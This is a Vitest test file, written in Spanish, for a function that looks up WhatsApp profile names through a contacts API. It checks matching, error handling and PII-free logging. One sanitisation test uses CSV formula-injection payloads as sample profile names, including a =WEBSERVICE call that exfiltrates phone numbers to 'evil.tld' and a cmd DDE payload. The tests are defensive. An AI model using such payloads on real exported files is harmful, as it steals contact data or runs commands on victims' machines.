import { describe, expect, it, vi } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fuenteLimpia } from '@iaxti/core/testing';
import { identidadDePerfil, nombreDePerfil, type IdentidadDePerfil } from '../application/perfil';

/**
 * El nombre de perfil de WhatsApp, medido POR EL PUERTO (#1170, #870).
 *
 * Nada de esto toca la API de verdad: se intercepta el `fetch` y se mira el
 * pedido HTTP que sale, que es el único lugar donde se puede ver con qué
 * parámetro estamos consultando y qué hacemos con lo que vuelve.
 */

const TELEFONO = '+56912345678';
const DIGITOS = '56912345678';
const ELLA: IdentidadDePerfil = { tipo: 'telefono', telefono: TELEFONO };
const BSUID = 'US.13491208655302741918';

function respuesta(cuerpo: unknown, status = 200): Response {
  return new Response(JSON.stringify(cuerpo), {
    status,
    headers: { 'Content-Type': 'application/json' },
  });
}

/** Un `fetch` que anota lo que le pidieron y contesta lo que se le diga. */
function fetchFalso(responder: (url: string) => Response | Promise<Response>) {
  const pedidos: string[] = [];
  const llamar = vi.fn(async (url: string | URL | Request, init?: RequestInit) => {
    pedidos.push(String(url));
    // La llave viaja por cabecera, no por la URL.
    expect(new Headers(init?.headers).get('Authorization')).toBe('Bearer zv_test_llave');
    return responder(String(url));
  });
  return { pedidos, llamar: llamar as unknown as typeof globalThis.fetch };
}

const config = (llamar: typeof globalThis.fetch, avisar?: (m: string) => void) => ({
  apiKey: 'zv_test_llave',
  apiBase: 'https://api.zavu.example/v1',
  fetch: llamar,
  avisar,
});

/** El contacto, como lo devuelve la API medida. */
const javiera = (extra: Record<string, unknown> = {}) => ({
  id: 'c1',
  phoneNumber: TELEFONO,
  primaryPhone: TELEFONO,
  countryCode: 'CL',
  profileName: 'Javiera Rojas',
  whatsapp: { bsuid: 'bs_1' },
  verified: true,
  createdAt: '2026-10-30T12:00:00Z',
  ...extra,
});

describe('clasificar la identidad antes de preguntar', () => {
  it('un teléfono es un teléfono', () => {
    expect(identidadDePerfil('+56912345678')).toEqual({ tipo: 'telefono', telefono: '+56912345678' });
    expect(identidadDePerfil('+56 9 1234 5678')).toEqual({
      tipo: 'telefono',
      telefono: '+56 9 1234 5678',
    });
  });

  it('un BSUID es un BSUID, NO un teléfono de 20 dígitos', () => {
    // El defecto que esto evita: `digitos('US.1349…')` deja 20 dígitos y pasaba
    // cualquier guarda de «parece un teléfono». Se iba una búsqueda de
    // teléfonos por cada mensaje de ese contacto, que jamás podía calzar.
    expect(identidadDePerfil(BSUID)).toEqual({ tipo: 'bsuid', bsuid: BSUID });
  });

  it('un grupo no tiene nombre de perfil, así que no se clasifica', () => {
    expect(identidadDePerfil('123456789@g.us')).toBeNull();
  });

  it('un id de chat de Instagram tampoco', () => {
    expect(identidadDePerfil('ig_7f3a')).toBeNull();
    expect(identidadDePerfil('ig_17841400000009')).toBeNull();
  });

  it('nada, vacío o demasiado corto: nada que buscar', () => {
    expect(identidadDePerfil(null)).toBeNull();
    expect(identidadDePerfil(undefined)).toBeNull();
    expect(identidadDePerfil('   ')).toBeNull();
    // Ocho dígitos es el mínimo: un celular chileno sin código de país.
    expect(identidadDePerfil('+56912')).toBeNull();
  });
});

describe('la consulta que sale a Zavu', () => {
  it('usa el filtro exacto que documenta el proveedor, y NUNCA `?phone=`', async () => {
    const { pedidos, llamar } = fetchFalso(() => respuesta({ items: [javiera()] }));
    await nombreDePerfil(ELLA, config(llamar));

    expect(pedidos).toHaveLength(1);
    const url = new URL(pedidos[0]);
    expect(url.pathname).toBe('/v1/contacts');
    // Lo medido: `?phone=` se IGNORA y devuelve la lista entera. Lo que la
    // medición NO decía, y la doc del proveedor sí, es que el parámetro se
    // llama `phoneNumber`: `?phone=` no filtra porque no existe.
    expect(url.searchParams.get('phone')).toBeNull();
    expect(url.searchParams.get('phoneNumber')).toBe(TELEFONO);
  });

  it('el nombre del perfil, cuando el número que vuelve es el que se buscó', async () => {
    const { llamar } = fetchFalso(() => respuesta({ items: [javiera()] }));
    expect(await nombreDePerfil(ELLA, config(llamar))).toBe('Javiera Rojas');
  });

  it('cae a `search` solo cuando el filtro exacto no trajo a la persona', async () => {
    // El escenario que esto cubre: si `phoneNumber` tampoco filtrara, la
    // respuesta sería la lista entera y la comprobación por dígitos la
    // descarta. Entonces se usa la búsqueda, que es el camino MEDIDO contra la
    // API de verdad. O sea: nunca peor que usar solo `search`.
    const { pedidos, llamar } = fetchFalso((url) =>
      url.includes('phoneNumber')
        ? respuesta({ items: [{ id: 'c9', phoneNumber: '+56987654321', profileName: 'Otro' }] })
        : respuesta({ items: [javiera()] }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar))).toBe('Javiera Rojas');

    expect(pedidos).toHaveLength(2);
    expect(new URL(pedidos[1]).searchParams.get('search')).toBe(DIGITOS);
    expect(new URL(pedidos[1]).search).not.toContain('+');
  });

  it('con el filtro exacto acertando, la búsqueda no se llega a usar', async () => {
    const { pedidos, llamar } = fetchFalso(() => respuesta({ items: [javiera()] }));
    await nombreDePerfil(ELLA, config(llamar));
    expect(pedidos).toHaveLength(1);
  });

  it('un número escrito distinto es el mismo número', async () => {
    // Lo que se guarda es E.164 y lo que vuelve puede traer espacios o
    // paréntesis: la comparación es por dígitos, no por texto.
    const { llamar } = fetchFalso(() =>
      respuesta({ items: [{ id: 'c1', phoneNumber: '+56 9 1234 5678', profileName: 'Javiera' }] }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar))).toBe('Javiera');
  });

  it('respeta el emoji del perfil', async () => {
    const { llamar } = fetchFalso(() =>
      respuesta({ items: [javiera({ profileName: 'Javiera 🌻' })] }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar))).toBe('Javiera 🌻');
  });
});

describe('el campo de teléfono vigente cuenta igual que el deprecado', () => {
  it('calza por `primaryPhone` cuando `phoneNumber` no viene', async () => {
    // El proveedor declara `phoneNumber` DEPRECADO en favor de `primaryPhone`
    // («The legacy `phoneNumber` field on Contact is deprecated»). Apoyarse
    // solo en el deprecado era elegir entre caerse hoy o caerse el día de la
    // migración — y peor: cada mensaje habría disparado el aviso que existe
    // para detectar que el filtro dejó de filtrar, volviéndolo ruido.
    const avisar = vi.fn();
    const { llamar } = fetchFalso(() =>
      respuesta({
        items: [
          {
            id: 'c1',
            primaryPhone: TELEFONO,
            countryCode: 'CL',
            profileName: 'Javiera',
            whatsapp: { bsuid: 'bs_1' },
          },
        ],
      }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBe('Javiera');
    expect(avisar).not.toHaveBeenCalled();
  });

  it('calza por `phoneNumber` cuando `primaryPhone` no viene', async () => {
    const { llamar } = fetchFalso(() =>
      respuesta({ items: [{ id: 'c1', phoneNumber: TELEFONO, profileName: 'Javiera' }] }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar))).toBe('Javiera');
  });

  it('sin ningún campo de teléfono, el item no se da por bueno', async () => {
    const avisar = vi.fn();
    const { llamar } = fetchFalso(() =>
      respuesta({ items: [{ id: 'c1', profileName: 'Javiera' }] }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
    expect(avisar).toHaveBeenCalledWith(
      'ni el filtro exacto ni la búsqueda devolvieron el número buscado',
    );
  });
});

describe('la trampa: lo que vuelve se comprueba', () => {
  it('si vuelve OTRO contacto por los dos caminos, no se usa su nombre', async () => {
    // Esto es lo que pasa cuando el filtro no filtra: llega la página entera
    // y el primero es otra persona. Escribirle SU nombre a este contacto es
    // peor que dejarlo con el número.
    const avisar = vi.fn();
    const { pedidos, llamar } = fetchFalso(() =>
      respuesta({
        items: [
          { id: 'c9', phoneNumber: '+56987654321', primaryPhone: '+56987654321', profileName: 'Matías Soto' },
          { id: 'c8', phoneNumber: '+56911112222', primaryPhone: '+56911112222', profileName: 'Carolina Díaz' },
        ],
      }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
    expect(pedidos).toHaveLength(2);
    expect(avisar).toHaveBeenCalledWith(
      'ni el filtro exacto ni la búsqueda devolvieron el número buscado',
    );
  });

  it('elige el que calza aunque no sea el primero', async () => {
    const { llamar } = fetchFalso(() =>
      respuesta({
        items: [
          { id: 'c9', phoneNumber: '+56987654321', profileName: 'Matías Soto' },
          javiera({ profileName: 'Javiera' }),
        ],
      }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar))).toBe('Javiera');
  });
});

describe('quien escondió su número: el BSUID', () => {
  it('se busca y se comprueba contra `whatsapp.bsuid`, no contra un teléfono', async () => {
    const { pedidos, llamar } = fetchFalso(() =>
      respuesta({
        items: [
          { id: 'c9', phoneNumber: '+56987654321', whatsapp: { bsuid: 'US.999' }, profileName: 'Otro' },
          { id: 'c1', phoneNumber: null, whatsapp: { bsuid: BSUID }, profileName: 'Lucho' },
        ],
      }),
    );
    const nombre = await nombreDePerfil({ tipo: 'bsuid', bsuid: BSUID }, config(llamar));
    expect(nombre).toBe('Lucho');
    // Un solo pedido: para un BSUID no hay filtro exacto documentado.
    expect(pedidos).toHaveLength(1);
    expect(new URL(pedidos[0]).searchParams.get('search')).toBe('13491208655302741918');
  });

  it('si no calza, no gasta el aviso de la trampa', async () => {
    // La búsqueda de un BSUID no está medida contra la API, así que su fallo es
    // esperable. El aviso existe para «el filtro exacto dejó de filtrar»: si
    // saltara acá, sería ruido en cada contacto con nombre de usuario y dejaría
    // de servir para lo que se escribió.
    const avisar = vi.fn();
    const { llamar } = fetchFalso(() =>
      respuesta({ items: [{ id: 'c9', phoneNumber: '+56987654321', profileName: 'Otro' }] }),
    );
    expect(await nombreDePerfil({ tipo: 'bsuid', bsuid: BSUID }, config(llamar, avisar))).toBeNull();
    expect(avisar).not.toHaveBeenCalled();
  });
});

describe('un perfil puede no tener nombre', () => {
  for (const [caso, profileName] of [
    ['vacío', ''],
    ['solo espacios', '   '],
    ['null', null],
    ['un número en vez de texto', 42],
  ] as const) {
    it(`${caso} → null, sin aviso: se puede no tener nombre`, async () => {
      const avisar = vi.fn();
      const { llamar } = fetchFalso(() => respuesta({ items: [javiera({ profileName })] }));
      expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
      expect(avisar).not.toHaveBeenCalled();
    });
  }

  it('ausente del todo → null', async () => {
    const { llamar } = fetchFalso(() =>
      respuesta({ items: [{ id: 'c1', phoneNumber: TELEFONO }] }),
    );
    expect(await nombreDePerfil(ELLA, config(llamar))).toBeNull();
  });

  it('un número que Zavu no conoce no es un fallo y no se avisa', async () => {
    const avisar = vi.fn();
    const { pedidos, llamar } = fetchFalso(() => respuesta({ items: [] }));
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
    // Los dos caminos devolvieron vacío: eso es lo normal con cada persona
    // nueva, y avisar de lo normal es la forma más rápida de que nadie lea los
    // avisos.
    expect(pedidos).toHaveLength(2);
    expect(avisar).not.toHaveBeenCalled();
  });
});

describe('cuando Zavu no colabora, el mensaje ya entró', () => {
  it('un 500 no lanza: devuelve null, dice el estado y NO insiste', async () => {
    const avisar = vi.fn();
    const { pedidos, llamar } = fetchFalso(() => respuesta({ error: 'boom' }, 500));
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
    expect(avisar).toHaveBeenCalledWith('Zavu respondió 500');
    // Un solo pedido: el proveedor está caído, reintentar con el otro
    // parámetro es otro viaje al mismo lugar y un segundo aviso igual.
    expect(pedidos).toHaveLength(1);
    expect(avisar).toHaveBeenCalledTimes(1);
  });

  it('un cuerpo que no es JSON no lanza', async () => {
    const avisar = vi.fn();
    const { llamar } = fetchFalso(() => new Response('<html>502</html>', { status: 200 }));
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
    expect(avisar).toHaveBeenCalledWith('Zavu respondió algo que no es JSON');
  });

  it('una respuesta sin `items` no lanza', async () => {
    const avisar = vi.fn();
    const { llamar } = fetchFalso(() => respuesta({ data: [] }));
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
    expect(avisar).toHaveBeenCalledWith('la respuesta de Zavu no trae contactos');
  });

  it('hay plazo, y vencerlo no lanza', async () => {
    const avisar = vi.fn();
    // El plazo se le pasa al `fetch` por `signal`: acá se espera ese signal y
    // se rechaza como lo haría la plataforma cuando vence.
    const llamar = (async (_url: string, init?: RequestInit) => {
      expect(init?.signal).toBeInstanceOf(AbortSignal);
      await new Promise((listo) => init?.signal?.addEventListener('abort', listo));
      throw Object.assign(new Error('The operation was aborted'), { name: 'TimeoutError' });
    }) as unknown as typeof globalThis.fetch;

    const nombre = await nombreDePerfil(ELLA, {
      apiKey: 'zv_test_llave',
      apiBase: 'https://api.zavu.example/v1',
      fetch: llamar,
      timeoutMs: 20,
      avisar,
    });
    expect(nombre).toBeNull();
    expect(avisar).toHaveBeenCalledWith('Zavu no contestó dentro del plazo');
  });

  it('la red caída no lanza', async () => {
    const avisar = vi.fn();
    const llamar = (async () => {
      // Así es el error real: el mensaje de un `fetch` fallido trae la URL, y
      // la URL lleva el teléfono.
      throw new TypeError(`fetch failed https://api.zavu.example/v1/contacts?search=${DIGITOS}`);
    }) as unknown as typeof globalThis.fetch;
    expect(await nombreDePerfil(ELLA, config(llamar, avisar))).toBeNull();
    expect(avisar).toHaveBeenCalledWith('no se pudo llamar a Zavu');
  });

  it('sin credencial no se llama a nadie', async () => {
    const avisar = vi.fn();
    const { pedidos, llamar } = fetchFalso(() => respuesta({ items: [] }));
    const nombre = await nombreDePerfil(ELLA, { apiKey: '', fetch: llamar, avisar });
    expect(nombre).toBeNull();
    expect(pedidos).toEqual([]);
    expect(avisar).toHaveBeenCalledWith('la credencial del canal no está en este ambiente');
  });
});

describe('lo que llega se limpia, no se reescribe', () => {
  async function nombreDe(profileName: string): Promise<string | null> {
    const { llamar } = fetchFalso(() => respuesta({ items: [javiera({ profileName })] }));
    return nombreDePerfil(ELLA, config(llamar));
  }

  it('los controles y los saltos de línea no entran a la bandeja', async () => {
    expect(await nombreDe('Javiera\u0000\u0007 Rojas')).toBe('Javiera Rojas');
    expect(await nombreDe('Javiera\nRojas')).toBe('Javiera Rojas');
    expect(await nombreDe('  Javiera   Rojas  ')).toBe('Javiera Rojas');
  });

  it('un nombre de 500 caracteres se corta, y no al medio de un emoji', async () => {
    const largo = await nombreDe(`${'a'.repeat(79)}🌻${'b'.repeat(420)}`);
    expect(Array.from(largo ?? '')).toHaveLength(80);
    // El emoji entero o nada: si se cortara por bytes quedaría medio par
    // suplente y la bandeja mostraría un rombo.
    expect(largo?.endsWith('🌻')).toBe(true);
  });

  it('un nombre que es una fórmula de planilla no es un nombre', async () => {
    // El ataque completo: el nombre de perfil entra a `contacts.name` sin que
    // intervenga una persona, y Contactos → Exportar sirve un CSV pensado para
    // abrirse en Excel. `=WEBSERVICE("…"&B2)` se evalúa al abrir el archivo y
    // se lleva los teléfonos de la columna vecina al servidor del atacante.
    // La defensa de SALIDA está en `csvSeguro`; esta es la de entrada.
    expect(await nombreDe('=WEBSERVICE("https://evil.tld/?x="&B2&"|"&B3)')).toBe(
      'WEBSERVICE("https://evil.tld/?x="&B2&"|"&B3)',
    );
    expect(await nombreDe('=cmd|\' /C calc\'!A0')).toBe('cmd|\' /C calc\'!A0');
    expect(await nombreDe('@SUM(A1:A9)')).toBe('SUM(A1:A9)');
    expect(await nombreDe('+1+1')).toBe('1+1');
    // Y si lo único que traía era el arranque de la fórmula, no queda nombre.
    expect(await nombreDe('===')).toBeNull();
  });

  it('un nombre normal no se toca', async () => {
    expect(await nombreDe('Javiera Rojas')).toBe('Javiera Rojas');
    expect(await nombreDe('María José Ñuñez')).toBe('María José Ñuñez');
  });
});

describe('el motivo que se registra no lleva el dato (PII)', () => {
  it('ni el teléfono ni el nombre del perfil aparecen en ningún aviso', async () => {
    const motivos: string[] = [];
    const avisar = (m: string) => motivos.push(m);
    const casos: Array<() => Response | Promise<Response>> = [
      () => respuesta({ error: 'x' }, 403),
      () => new Response('no json', { status: 200 }),
      () => respuesta({ data: [] }),
      () =>
        respuesta({
          items: [{ id: 'c9', phoneNumber: '+56987654321', profileName: 'Matías Soto' }],
        }),
    ];
    for (const caso of casos) {
      const { llamar } = fetchFalso(caso);
      await nombreDePerfil(ELLA, config(llamar, avisar));
    }
    const llamarCaido = (async () => {
      throw new TypeError(`fetch failed https://api.zavu.example/v1/contacts?search=${DIGITOS}`);
    }) as unknown as typeof globalThis.fetch;
    await nombreDePerfil(ELLA, config(llamarCaido, avisar));

    expect(motivos.length).toBe(5);
    for (const motivo of motivos) {
      expect(motivo).not.toContain(DIGITOS);
      expect(motivo).not.toContain('12345678');
      expect(motivo).not.toContain('Matías');
      expect(motivo).not.toMatch(/\d{8}/);
    }
  });

  it('la consulta no escribe en el log por su cuenta', () => {
    // Una guarda de FUENTE: la pregunta es «¿está escrito?». Si mañana
    // alguien mete un `console.warn` con el nombre del perfil para
    // diagnosticar, el dato personal se va al log del worker y nadie lo nota.
    const fuente = fuenteLimpia(
      readFileSync(join(__dirname, '..', 'application', 'perfil.ts'), 'utf8'),
    );
    expect(fuente).not.toContain('console.');
    // Y el parámetro que se IGNORA no vuelve por la puerta de atrás. Se mide
    // sobre la fuente limpia para que el comentario que lo explica —que
    // nombra `?phone=` a propósito— no ponga roja su propia guarda (#569).
    expect(fuente).not.toContain("{ phone:");
    expect(fuente).not.toContain('phone=');
    // Lo que SÍ tiene que estar: el filtro exacto documentado y la búsqueda
    // medida, los dos.
    expect(fuente).toContain('phoneNumber');
    expect(fuente).toContain('search');
  });
});
